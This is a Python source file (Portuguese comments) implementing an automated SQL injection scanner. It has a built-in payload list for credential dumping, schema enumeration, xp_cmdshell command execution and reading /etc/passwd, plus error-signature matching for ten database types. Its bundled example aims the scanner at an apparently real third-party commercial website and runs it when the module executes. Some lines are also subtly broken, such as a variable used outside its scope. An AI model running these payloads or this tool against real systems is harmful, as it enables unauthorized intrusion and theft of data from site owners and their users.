import asyncio
import re

import jsonlog
import functions
import commons


async def sqli_score_system(payload, r):
    score = 5  # Pontuação inicial, pre-validado (max: 20pts)
    dbase_types = ['mysql', 'postgresql', 'sqlserver', 'oracle', 'mongodb', 'sqlite', 'redis', 'db2', 'mariadb', 'cockroachdb']
    suspicious = {
        'response_length': 3 if len(r.text) > 1500 else 2 if len(r.text) < 200 else 0,
        'response_time': 6 if r.elapsed.total_seconds() > 10 else 4 if r.elapsed.total_seconds() > 5 else 0,
        'response_code': 3 if r.status_code == 500 else 2 if r.status_code == 403 else 0,
        'response_header': 3 if "X-Powered-By" in r.headers and any(b in r.headers.get('X-Powered-By', '').lower() for b in dbase_types) else 0,
    }
    score += sum(v for v in suspicious.values())
    return score

async def sqli(origin, file=None, ua_status=False, timeout=10, SSL=True, proxies=None, interval=1, continue_=False, score_sqli=False):
    # CONSTANTES
    name_save_file = 'sqli_test.json'
    scheme = 'https' if SSL else 'http'

    default_payload = [
        "1 OR 1=1",
        "' OR '1'='1'--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT username, password FROM users--",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' OR 1=1#",
        "' OR 'x'='x",
        "1 AND 1=2",
        "1 UNION ALL SELECT NULL,NULL,NULL--",
        "1' AND SLEEP(5)--",
        "1' AND pg_sleep(5)--",
        "1 WAITFOR DELAY '00:00:05'--",
        "' OR EXISTS(SELECT * FROM users)--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
        "1; EXEC xp_cmdshell('whoami')--",
        "1; SELECT load_file('/etc/passwd')--",
        "' UNION SELECT 1,database(),user()--",
        "admin' AND 1=(SELECT COUNT(*) FROM tablename)--",
        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>77--",
        "' OR updatexml(1,concat(0x7e,(SELECT database())),0)--",
        "' OR extractvalue(1,concat(0x7e,(SELECT user())))--",
        "1;SELECT+PG_SLEEP(5)",
        "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--",
    ]
    
    error_messages = {
        'mysql': [
            r"You have an error in your SQL syntax", r"mysql", r"SQL syntax", 
            r"Query failed", r"database error", r"invalid query", r"incorrect syntax", 
            r"error in your SQL syntax", r"unclosed quotation mark", r"unexpected EOF", 
            r"unexpected token", r"unable to execute", r"invalid input"
        ],
        'postgresql': [
            r"syntax error", r"invalid input syntax for type", r"pg_sleep", 
            r"unrecognized statement", r"failed to open", r"unrecognized variable", 
            r"missing FROM-clause entry", r"division by zero", r"invalid regular expression"
        ],
        'sqlserver': [
            r"Msg \d+", r"Incorrect syntax", r"WAITFOR DELAY", r"incorrect syntax near", 
            r"conversion failed when converting the varchar value", 
            r"cannot insert the value", r"unclosed quotation mark after the character string", 
            r"Invalid object name", r"Arithmetic overflow error"
        ],
        'oracle': [
            r"ORA-\d+:.*", r"SQL command not properly ended", r"missing expression", r"invalid number", 
            r"invalid identifier", r"ORA-00933:.*", r"ORA-01756:.*", r"ORA-00904:.*", 
            r"ORA-01428:.*", r"ORA-01476:.*", r"ORA-12899: value too large for column.*"
        ],
        'mongodb': [
            r"SyntaxError: Unexpected token.*", 
            r"FieldError: Unknown field.*", 
            r"BSONObj size.*", r"MongoError:", r"Cannot apply \$.*", 
            r"Unterminated string in JSON.*"
        ],
        'sqlite': [
            r"SQLite error:.*", r"no such column:.*", r"datatype mismatch", 
            r"UNIQUE constraint failed.*", r"near \"\": syntax error", 
            r"unrecognized token:.*", r"too many SQL variables", 
            r"attempt to write a readonly database"
        ],
        'redis': [
            r"ERR unknown command.*", r"ERR syntax error", r"WRONGTYPE Operation.*", 
            r"OUT OF MEMORY", r"BUSY Redis is busy running a script"
        ],
        'db2': [
            r"SQLCODE=-\d+", r"DB2 SQL Error:.*", r"SQLSTATE=.*", 
            r"SQLCODE: -302", r"SQLERRMC=.*", 
            r"A character that is not valid.*"
        ],
        'mariadb': [
            r"You have an error in your SQL syntax", r"MariaDB server version.*", 
            r"incorrect parameter count in the call to native function.*", 
            r"Query execution failed.*"
        ],
        'cockroachdb': [
            r"unexpected value", r"invalid syntax", r"pq: syntax error", 
            r"relation .* does not exist", r"column .* does not exist"
        ],
    }

    if file == None:
        print(f'[#][{commons.time_now()}] Implementando o uso de payloads padrao')
        payloads = default_payload
    else:
        status_payload, payloads = await commons.fileReader(file)
        if not status_payload:
            print(f'[-][{commons.time_now()}] {payloads}')
            return False, payloads
    
    async def sqli_async(payloads):
        for payload in payloads:
            # VARIAVEIS
            ip = ''
            score = 0
            details = {}
            html_sample = ''
            
            payload = payload.strip()
            
            url = f'{scheme}://{origin}'.replace('*', payload)

            await asyncio.sleep(interval)

            print(f'[+][{commons.time_now()}] Tentando: {url}')
            status, r = commons.request(url, ua_status=ua_status, timeout=timeout,
                                        SSL=SSL, redirect=False, proxies=proxies)
            
            if status:
                for k, v in error_messages.items(): # itera sobre o dicionario
                    # if any(error_msg.lower() in r.text.lower() for error_msg in v): 
                    if any(re.search(error_msg.lower(), r.text.lower()) for error_msg in v): # verifica o tipo de erro no retorno
                        details['db type'] = k
                        html_sample = r.text if r.status_code in [301, 302, 307] else r.text[:500]
                        
                        if score_sqli:
                            score = await sqli_score_system(payload, r)
                            details['SQLi Score'] = score
                        
                        print(f'{" "*3}[>][{commons.time_now()}][{r.status_code}] Possível vulnerabilidade: {url} -> {payload}')
                        print(f'{" "*3}[>] Tipo: {k} Msg: {error_msg} url: {url} Score: {score}')
                        
                        if not continue_:
                            return True, f'[#][{functions.time_now()}][{r.status_code}] Possível vulnerabilidade: {url} -> {payload}'     
            else:
                print(f'{" "*3}[>][{commons.time_now()}] Falha ao requisitar: {r}')
            
            # transforma em json object
            json_obj_response = jsonlog.ObjectJson.from_data(domain=origin, payload=payload, url=url, ip=ip, r=r, html_sample=html_sample, details=details)
            write = await jsonlog.AsyncLogger(name_save_file).json_write(json_obj_response)

        return True, f'[#] Wordlist concluido: {file} & Gerado arquivo: {name_save_file}'
    
    await sqli_async(payloads) # executa todo o loop e aguarda
            

# Exemplo de uso
async def main():
    try:
        status, attk = await sqli(
            'www.constinta.com.br/v1-index-php-lojas?srsltid=*',
            continue_=True,
            score_sqli=True,
        )
    except TypeError:
        return True, f'[#] Execucao finalizada'

asyncio.run(main())